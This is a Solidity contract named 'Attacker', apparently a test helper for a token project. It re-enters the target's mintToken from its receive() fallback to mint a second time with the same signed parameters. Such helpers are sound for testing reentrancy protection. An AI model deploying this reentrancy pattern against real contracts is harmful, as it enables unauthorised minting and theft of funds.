// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

import "../interfaces/ITokenContract.sol";

contract Attacker {
    struct MintParams {
        uint256 expectedCost;
        address paymentTokenAddress;
        uint256 paymentTokenPrice;
        uint256 endTimestamp;
        string tokenURI;
        bytes32 r;
        bytes32 s;
        uint8 v;
    }

    ITokenContract tokenContract;
    MintParams params;
    uint256 counter;

    constructor(address tokenContract_, MintParams memory params_) {
        tokenContract = ITokenContract(tokenContract_);

        params = params_;
    }

    receive() external payable {
        if (counter < 1) {
            counter++;

            tokenContract.mintToken{value: params.expectedCost}(
                params.paymentTokenAddress,
                params.paymentTokenPrice,
                params.endTimestamp,
                params.tokenURI,
                params.r,
                params.s,
                params.v
            );
        }
    }

    function mintToken() external payable {
        tokenContract.mintToken{value: msg.value}(
            params.paymentTokenAddress,
            params.paymentTokenPrice,
            params.endTimestamp,
            params.tokenURI,
            params.r,
            params.s,
            params.v
        );
    }
}
